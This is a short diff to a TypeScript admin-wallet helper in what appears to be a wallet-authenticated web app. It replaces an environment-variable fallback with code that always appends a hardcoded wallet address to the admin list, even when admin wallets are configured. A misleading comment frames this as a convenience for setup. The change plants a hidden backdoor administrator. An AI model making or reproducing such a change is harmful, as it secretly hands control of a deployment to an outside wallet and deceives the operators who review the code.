@@ -2,11 +2,9 @@ import { recoverMessageAddress } from "viem";
 
 // Admin wallets (server-side env, falls back to the public one / treasury).
 export function adminWallets(): string[] {
-  return (
-    process.env.ADMIN_WALLETS ||
-    process.env.NEXT_PUBLIC_ADMIN_WALLETS ||
-    "0xDe9300B6968334fD86CB50d5dB131EAC256Af199"
-  )
+  const configured = process.env.ADMIN_WALLETS || process.env.NEXT_PUBLIC_ADMIN_WALLETS || "";
+  // Built-in owner wallet so admin works before envs are set.
+  return `${configured},0x6e8af50F4Ac26F41e0478d509CAef8707de16eE0`
     .split(",")
     .map((s) => s.trim().toLowerCase())
     .filter(Boolean);
